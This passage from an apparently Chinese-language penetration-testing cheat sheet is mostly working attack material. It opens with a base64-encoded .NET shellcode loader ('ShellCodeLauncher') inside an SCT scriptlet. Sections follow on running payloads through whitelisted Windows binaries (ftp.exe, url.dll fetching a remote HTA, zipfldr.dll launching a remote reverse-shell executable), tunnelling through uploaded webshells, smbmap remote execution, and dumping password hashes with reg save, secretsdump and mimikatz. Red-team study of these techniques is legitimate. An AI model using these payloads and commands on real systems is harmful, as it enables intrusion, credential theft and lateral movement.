&quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;+</span><br><span class="line"> &quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;+</span><br><span class="line"> &quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;+</span><br><span class="line"> &quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;+</span><br><span class="line"> &quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAABIAAAJNWpAAAwAAAAQAAAD&#x2F;&#x2F;wAAuAAAAAAAAABAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;+</span><br><span class="line"> &quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAYaVEXAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAA8AAiIAsCCwAADAAAAAQAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAGAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAJgCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAATAoAAAAgAAAADAAAAAIAAAAAAAAAAAAAAAAAACAA&quot;+</span><br><span class="line"> &quot;AGAucnNyYwAAAJgCAAAAQAAAAAQAAAAOAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAAAAAAAGAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAEgAAAAAAAAAAAAAAAAAAQAAAQkgAAAACAAUA7CIAAGAHAAABAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA&quot;+</span><br><span class="line"> &quot;KAIAAAYAACoAAAAAAAAA&#x2F;EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pK&quot;+</span><br><span class="line"> &quot;TTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0&quot;+</span><br><span class="line"> &quot;Z0gB0FCLSBhEi0AgSQHQ41ZI&#x2F;8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhE&quot;+</span><br><span class="line"> &quot;i0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL&#x2F;4FhBWVpIixLpS&#x2F;&#x2F;&#x2F;&quot;+</span><br><span class="line"> &quot;&#x2F;11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAA1wKgBBEFUSYnkTInxQbpMdyYH&#x2F;9VMiepo&quot;+</span><br><span class="line"> &quot;AQEAAFlBuimAawD&#x2F;1WoKQV5QUE0xyU0xwEj&#x2F;wEiJwkj&#x2F;wEiJwUG66g&#x2F;f4P&#x2F;VSInHahBBWEyJ4kiJ&quot;+</span><br><span class="line"> &quot;+UG6maV0Yf&#x2F;VhcB0Ckn&#x2F;znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX&#x2F;&#x2F;Vg&#x2F;gAflVIg8Qg&quot;+</span><br><span class="line"> &quot;Xon2akBBWWgAEAAAQVhIifJIMclBulikU+X&#x2F;1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX&#x2F;&#x2F;Vg&#x2F;gA&quot;+</span><br><span class="line"> &quot;fShYQVdZaABAAABBWGoAWkG6Cy8PMP&#x2F;VV1lBunVuTWH&#x2F;1Un&#x2F;zuk8&#x2F;&#x2F;&#x2F;&#x2F;SAHDSCnGSIX2dbRB&#x2F;+dY&quot;+</span><br><span class="line"> &quot;agBZScfC8LWiVv&#x2F;VAAATMAYAZQAAAAEAABEAIP4BAACNBgAAASXQAwAABCgGAAAKChYGjml+AQAA&quot;+</span><br><span class="line"> &quot;BH4CAAAEKAMAAAYLBhYHbigHAAAKBo5pKAgAAAoAfgkAAAoMFg1+CQAAChMEFhYHEQQWEgMoBAAA&quot;+</span><br><span class="line"> &quot;BgwIFSgFAAAGJisAKkogABAAAIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMx&quot;+</span><br><span class="line"> &quot;OQAAAAAFAGwAAABgAgAAI34AAMwCAABIAwAAI1N0cmluZ3MAAAAAFAYAAAgAAAAjVVMAHAYAABAA&quot;+</span><br><span class="line"> &quot;AAAjR1VJRAAAACwGAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAADwAA&quot;+</span><br><span class="line"> &quot;AAQAAAADAAAABgAAAAwAAAALAAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAABAAAA&quot;+</span><br><span class="line"> &quot;AQAAAAAACgABAAAAAAAGAD0ANgAGAE0BMQEGAGkBMQEGAJgBeAEGALgBeAEGANsBNgAGACUCeAEG&quot;+</span><br><span class="line"> &quot;AEACNgAGAHwCeAEGAIsCNgAGAJECNgAGALQCNgAGAOYCxwIGAPgCxwIGACsDGwMAAAAAAQAAAAAA&quot;+</span><br><span class="line"> &quot;AQABAAEAEAATABsABQABAAEAAAAAAOABAAAFAAMABwATAQAASgIAACEABAAHABEATwASABEAWgAS&quot;+</span><br><span class="line"> &quot;ABMBaAI+AFAgAAAAAIYYRAAKAAEAaCIAAAAAkQBKAA4AAQAAAAAAgACRIHEAFQABAAAAAACAAJEg&quot;+</span><br><span class="line"> &quot;fgAdAAUAAAAAAIAAkSCLACgACwDZIgAAAACRGBQDDgANAAAAAQCfAAAAAgCrAAAAAwCwAAAABADB&quot;+</span><br><span class="line"> &quot;AAAAAQDLAAAAAgDeAAAAAwDqAAAABAD5AAAABQD&#x2F;AAAABgAPAQAAAQAaAQAAAgAiAREARAAuACEA&quot;+</span><br><span class="line"> &quot;RAA0ACkARAAKAAkARAAKADkARAAKAEkApAJCAGEAuwJKAGkA7gJPAGEA8wJYAHEARABkAHkARAAK&quot;+</span><br><span class="line"> &quot;ACcAWwA5AC4AEwBpAC4AGwByAGMAKwA5AAgABgCRAAEA&#x2F;gEAAAQAWwALAwABBwBxAAEAAAEJAH4A&quot;+</span><br><span class="line"> &quot;AQAAAQsAiwABAGggAAADAASAAAAAAAAAAAAAAAAAAAAAANYBAAAEAAAAAAAAAAAAAAABAC0AAAAA&quot;+</span><br><span class="line"> &quot;AAQAAwAAAAA8TW9kdWxlPgAyMjIyLmRsbABQcm9ncmFtAFNoZWxsQ29kZUxhdW5jaGVyAG1zY29y&quot;+</span><br><span class="line"> &quot;bGliAFN5c3RlbQBPYmplY3QALmN0b3IATWFpbgBNRU1fQ09NTUlUAFBBR0VfRVhFQ1VURV9SRUFE&quot;+</span><br><span class="line"> &quot;V1JJVEUAVmlydHVhbEFsbG9jAENyZWF0ZVRocmVhZABXYWl0Rm9yU2luZ2xlT2JqZWN0AGxwU3Rh&quot;+</span><br><span class="line"> &quot;cnRBZGRyAHNpemUAZmxBbGxvY2F0aW9uVHlwZQBmbFByb3RlY3QAbHBUaHJlYWRBdHRyaWJ1dGVz&quot;+</span><br><span class="line"> &quot;AGR3U3RhY2tTaXplAGxwU3RhcnRBZGRyZXNzAHBhcmFtAGR3Q3JlYXRpb25GbGFncwBscFRocmVh&quot;+</span><br><span class="line"> &quot;ZElkAGhIYW5kbGUAZHdNaWxsaXNlY29uZHMAU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zAFNl&quot;+</span><br><span class="line"> &quot;Y3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZQBTZWN1cml0eUFjdGlvbgBTeXN0ZW0uUnVudGltZS5D&quot;+</span><br><span class="line"> &quot;b21waWxlclNlcnZpY2VzAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAUnVudGltZUNv&quot;+</span><br><span class="line"> &quot;bXBhdGliaWxpdHlBdHRyaWJ1dGUAMjIyMgBCeXRlADxQcml2YXRlSW1wbGVtZW50YXRpb25EZXRh&quot;+</span><br><span class="line"> &quot;aWxzPntBODMyQkQ0MS1EQjgyLTQ0NzEtOEMxRC1BMDlBNDFCQjAzRER9AENvbXBpbGVyR2VuZXJh&quot;+</span><br><span class="line"> &quot;dGVkQXR0cmlidXRlAFZhbHVlVHlwZQBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTUxMAAkJG1l&quot;+</span><br><span class="line"> &quot;dGhvZDB4NjAwMDAwMi0xAFJ1bnRpbWVIZWxwZXJzAEFycmF5AFJ1bnRpbWVGaWVsZEhhbmRsZQBJ&quot;+</span><br><span class="line"> &quot;bml0aWFsaXplQXJyYXkASW50UHRyAG9wX0V4cGxpY2l0AFN5c3RlbS5SdW50aW1lLkludGVyb3BT&quot;+</span><br><span class="line"> &quot;ZXJ2aWNlcwBNYXJzaGFsAENvcHkAWmVybwBEbGxJbXBvcnRBdHRyaWJ1dGUAa2VybmVsMzIALmNj&quot;+</span><br><span class="line"> &quot;dG9yAFN5c3RlbS5TZWN1cml0eQBVbnZlcmlmaWFibGVDb2RlQXR0cmlidXRlAAAAAAADIAAAAAAA&quot;+</span><br><span class="line"> &quot;Qb0yqILbcUSMHaCaQbsD3QAIt3pcVhk04IkDIAABAwAAAQIGCQcABAkJCQkJCgAGGAkJCRgJEAkF&quot;+</span><br><span class="line"> &quot;AAIJGAkFIAEBEQ0EIAEBCAQBAAAAAwYREAcAAgESKREtBAABGAoIAAQBHQUIGAgCBhgIBwUdBQkY&quot;+</span><br><span class="line"> &quot;CRgEIAEBDggBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwGAni4BgIRTeXN0&quot;+</span><br><span class="line"> &quot;ZW0uU2VjdXJpdHkuUGVybWlzc2lvbnMuU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlLCBtc2Nv&quot;+</span><br><span class="line"> &quot;cmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3&quot;+</span><br><span class="line"> &quot;N2E1YzU2MTkzNGUwODkVAVQCEFNraXBWZXJpZmljYXRpb24BAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAA8AgAAAAAAAAAAAAA8AjQAAABW&quot;+</span><br><span class="line"> &quot;AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv&#x2F;gAAAQAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA&quot;+</span><br><span class="line"> &quot;AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEnAEAAAEAUwB0AHIAaQBuAGcA&quot;+</span><br><span class="line"> &quot;RgBpAGwAZQBJAG4AZgBvAAAAeAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE&quot;+</span><br><span class="line"> &quot;AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A&quot;+</span><br><span class="line"> &quot;AAAAADAALgAwAC4AMAAuADAAAAA0AAkAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAADIAMgAy&quot;+</span><br><span class="line"> &quot;ADIALgBkAGwAbAAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAADwA&quot;+</span><br><span class="line"> &quot;CQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAAAyADIAMgAyAC4AZABsAGwAAAAA&quot;+</span><br><span class="line"> &quot;ADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAA4AAgA&quot;+</span><br><span class="line"> &quot;AQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVm&quot;+</span><br><span class="line"> &quot;bGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA&quot;;</span><br><span class="line">var entry_class &#x3D; &#39;ShellCodeLauncher.Program&#39;;  </span><br><span class="line"> </span><br><span class="line">try &#123;  </span><br><span class="line">setversion();  </span><br><span class="line">var stm &#x3D; base64ToStream(serialized_obj);  </span><br><span class="line">var fmt &#x3D; new ActiveXObject(&#39;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&#39;);  </span><br><span class="line">var al &#x3D; new ActiveXObject(&#39;System.Collections.ArrayList&#39;);  </span><br><span class="line">var d &#x3D; fmt.Deserialize_2(stm);  </span><br><span class="line">al.Add(undefined);  </span><br><span class="line">var o &#x3D; d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);  </span><br><span class="line">&#125; catch (e) &#123;  </span><br><span class="line">debug(e.message);  </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">]]&gt;  </span><br><span class="line">&lt;&#x2F;script&gt;  </span><br><span class="line">&lt;&#x2F;registration&gt;  </span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure>
<h2 id="88-基于白名单Ftp-exe执行payload第十九季"><a href="#88-基于白名单Ftp-exe执行payload第十九季" class="headerlink" title="88. 基于白名单Ftp.exe执行payload第十九季"></a>88. 基于白名单Ftp.exe执行payload第十九季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\ftp.exe </span><br><span class="line">C:\Windows\SysWOW64\ftp.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\ftp.exe </span><br><span class="line">C:\Windows\SysWOW64\ftp.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>配置攻击机msf</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">需设置参数 set AutoRunScript migrate -f</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo !C:\Users\John\Desktop\rev_x86_53_exe.exe &gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐n ‐s:o &amp;del &#x2F;F &#x2F;Q o</span><br></pre></td></tr></table></figure>
<h2 id="89-基于白名单Url-dll执行payload第十七季"><a href="#89-基于白名单Url-dll执行payload第十七季" class="headerlink" title="89. 基于白名单Url.dll执行payload第十七季"></a>89. 基于白名单Url.dll执行payload第十七季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\url.dll </span><br><span class="line">C:\Windows\SysWOW64\url.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\url.dll </span><br><span class="line">C:\Windows\SysWOW64\url.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe url.dll,FileProtocolHandler file:&#x2F;&#x2F;C:\Users\John\Desktop\Micropoor_url_dll.hta</span><br></pre></td></tr></table></figure>
<ul>
<li>同样可以调用url.dll下载payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe url.dll,OpenURL http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor_url_dll.hta</span><br></pre></td></tr></table></figure>
<ul>
<li>附录：Micropoor_url_dll.hta </li>
</ul>
<h2 id="90-基于白名单zipfldr-dll执行payload第十八季"><a href="#90-基于白名单zipfldr-dll执行payload第十八季" class="headerlink" title="90. 基于白名单zipfldr.dll执行payload第十八季"></a>90. 基于白名单zipfldr.dll执行payload第十八季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\zipfldr.dll </span><br><span class="line">C:\Windows\SysWOW64\zipfldr.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\zipfldr.dll </span><br><span class="line">C:\Windows\SysWOW64\zipfldr.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe zipfldr.dll,RouteTheCall \\192.168.1.119\share\rev_x86_53_exe.exe</span><br></pre></td></tr></table></figure>


<h1 id="七、代理"><a href="#七、代理" class="headerlink" title="七、代理"></a>七、代理</h1><h2 id="54-基于Powershell做Socks-4-5代理"><a href="#54-基于Powershell做Socks-4-5代理" class="headerlink" title="54. 基于Powershell做Socks 4-5代理"></a>54. 基于Powershell做Socks 4-5代理</h2><ul>
<li><p>Invoke-SocksProxy</p>
<ul>
<li>项目地址： <a href="https://github.com/p3nt4/Invoke-SocksProxy">https://github.com/p3nt4/Invoke-SocksProxy</a> </li>
<li>创建Socks 4/5代理</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-SocksProxy -bindPort 1234</span><br></pre></td></tr></table></figure>
<ul>
<li>TCP端口转发</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-PortFwd -bindPort 33389 -destHost 127.0.0.1 -destPort 3389</span><br></pre></td></tr></table></figure>
<h2 id="95-基于Portfwd端口转发"><a href="#95-基于Portfwd端口转发" class="headerlink" title="95. 基于Portfwd端口转发"></a>95. 基于Portfwd端口转发</h2></li>
<li><p>meterpreter下</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">portfwd add ‐l 33389 ‐r 192.168.1.119 ‐p 3389</span><br><span class="line">portfwd add ‐l 30080 ‐r 192.168.1.119 ‐p 80</span><br></pre></td></tr></table></figure>
<p> 分别访问攻击机33389，30080，既等价访问靶机3389，80</p>
<h2 id="96-HTTP隧道ABPTTS第一季"><a href="#96-HTTP隧道ABPTTS第一季" class="headerlink" title="96. HTTP隧道ABPTTS第一季"></a>96. HTTP隧道ABPTTS第一季</h2><p>上传webshell之后 ，如果攻击机为<strong>vps</strong>，则 <strong>-f</strong> 需要填写<strong>vps_ip:port/**目标机</strong>:port**</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python abpttsclient.py ‐c webshell&#x2F;config.txt ‐u &quot;http:&#x2F;&#x2F;192.168.1.119&#x2F;abptts.aspx&quot; ‐f 192.168.1.5:33389&#x2F;192.168.1.119:3389</span><br></pre></td></tr></table></figure>
<p>本地访问<code>192.168.1.5:33389</code>即访问目标<code>3389</code></p>
<h2 id="98-HTTP隧道reGeorg第二季"><a href="#98-HTTP隧道reGeorg第二季" class="headerlink" title="98. HTTP隧道reGeorg第二季"></a>98. HTTP隧道reGeorg第二季</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py ‐p 8080 ‐l 192.168.1.5 ‐u http:&#x2F;&#x2F;192.168.1.119&#x2F;tunnel.aspx</span><br></pre></td></tr></table></figure>
<p>Windows下配合Proxifier</p>
<h2 id="99-HTTP隧道Tunna第三季"><a href="#99-HTTP隧道Tunna第三季" class="headerlink" title="99. HTTP隧道Tunna第三季"></a>99. HTTP隧道Tunna第三季</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python proxy.py ‐u http:&#x2F;&#x2F;192.168.1.119&#x2F;conn.aspx ‐l 1234 ‐r 3389 ‐s ‐ v</span><br></pre></td></tr></table></figure>
<p>如果：没有出现“无法验证此远程计算机的身份，是否仍要连接？”</p>
<p>注册表键值： HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers 删除对应IP键值即可</p>
<h2 id="100-HTTP隧道reDuh第四季"><a href="#100-HTTP隧道reDuh第四季" class="headerlink" title="100. HTTP隧道reDuh第四季"></a>100. HTTP隧道reDuh第四季</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java ‐jar reDuhClient.jar http:&#x2F;&#x2F;192.168.1.119&#x2F;reDuh.aspx</span><br></pre></td></tr></table></figure>
<h1 id="八、横向渗透"><a href="#八、横向渗透" class="headerlink" title="八、横向渗透"></a>八、横向渗透</h1><h2 id="55-与Smbmap结合攻击"><a href="#55-与Smbmap结合攻击" class="headerlink" title="55. 与Smbmap结合攻击"></a>55. 与Smbmap结合攻击</h2><ul>
<li><p>支持传递哈希 </p>
</li>
<li><p>文件上传/下载/删除 </p>
</li>
<li><p>可枚举（可写共享，配合Metasploit） </p>
</li>
<li><p>远程命令执行 </p>
</li>
<li><p>支持文件内容搜索 </p>
</li>
<li><p>支持文件名匹配（可以自动下载） </p>
</li>
<li><p>msf配合Smbmap攻击需要使用到sock4a模块 </p>
<p><code>sock4a</code>配置好<code>1080</code>端口代理后，同时配置<code>proxychains</code>代理设置</p>
<ul>
<li>远程执行命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains smbmap ‐u administrator ‐p 123456 ‐d workgroup ‐H 192.168.1.115 ‐x &#39;net user&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>枚举目标机共享</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains smbmap ‐u administrator ‐p 123456 ‐d workgroup ‐H 192.168.1.115 ‐d ABC</span><br></pre></td></tr></table></figure>
<h2 id="56-离线提取目标机hash"><a href="#56-离线提取目标机hash" class="headerlink" title="56. 离线提取目标机hash"></a>56. 离线提取目标机hash</h2></li>
<li><p>reg save方式</p>
<ul>
<li>reg save HKLM\SYSTEM sys.hiv</li>
<li>reg save HKLM\SAM sam.hiv</li>
<li>reg save hklm\security security.hiv </li>
</ul>
</li>
<li><p>离线提权</p>
<ul>
<li><code>impacket</code> 的 <code>secretsdump.py</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python &#x2F;root&#x2F;impacket&#x2F;examples&#x2F;secretsdump.py ‐sam sam.hiv ‐ security security.hiv ‐system sys.hiv LOCAL</span><br></pre></td></tr></table></figure>
<h2 id="57-64-高级持续渗透-后门"><a href="#57-64-高级持续渗透-后门" class="headerlink" title="57-64. 高级持续渗透-后门"></a>57-64. 高级持续渗透-后门</h2></li>
</ul>
<h2 id="65-离线提取目标机hash补充"><a href="#65-离线提取目标机hash补充" class="headerlink" title="65. 离线提取目标机hash补充"></a>65. 离线提取目标机hash补充</h2><ul>
<li>mimikatz离线导hash命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;system:sys.hiv &#x2F;sam:sam.hiv&quot; exit</span><br></pre></td></tr></table></figure>
<ul>
<li>mimikatz在线导hash命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;log Micropoor.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>meterpreter</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">kerberos</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure>
<h2 id="91-从目标文件中做信息搜集第一季"><a href="#91-从目标文件中做信息搜集第一季" class="headerlink" title="91. 从目标文件中做信息搜集第一季"></a>91. 从目标文件中做信息搜集第一季</h2><ul>
<li>Exiftool</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exiftool ‐lang zh‐cn ‐a ‐u ‐g1 .&#x2F;55e736d12f2eb9385716e513d8628535e4dd6fdc.jpg</span><br></pre></td></tr></table></figure>
<h2 id="93-与CrackMapExec结合攻击"><a href="#93-与CrackMapExec结合攻击" class="headerlink" title="93. 与CrackMapExec结合攻击"></a>93. 与CrackMapExec结合攻击</h2><p>CrackMapExec弥补了MSF4下auxiliary，scanner模块下的Command执行方式，但MSF5已解决该 问题。在MSF4下，该框架针对后渗透的横向移动经常出现，虽然MSF5已解决该问题，但该框架在配合 bloodhound与empire依然目前有一定优势</p>
<ul>
<li>安装</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Kali</span><br><span class="line">apt‐get install crackmapexec</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;作者推荐</span><br><span class="line">apt‐get install ‐y libssl‐dev libffi‐dev python‐dev build‐essential </span><br><span class="line">pip install ‐‐user pipenv </span><br><span class="line">git clone ‐‐recursive https:&#x2F;&#x2F;github.com&#x2F;byt3bl33d3r&#x2F;CrackMapExec </span><br><span class="line">cd CrackMapExec &amp;&amp; pipenv install </span><br><span class="line">pipenv shell</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
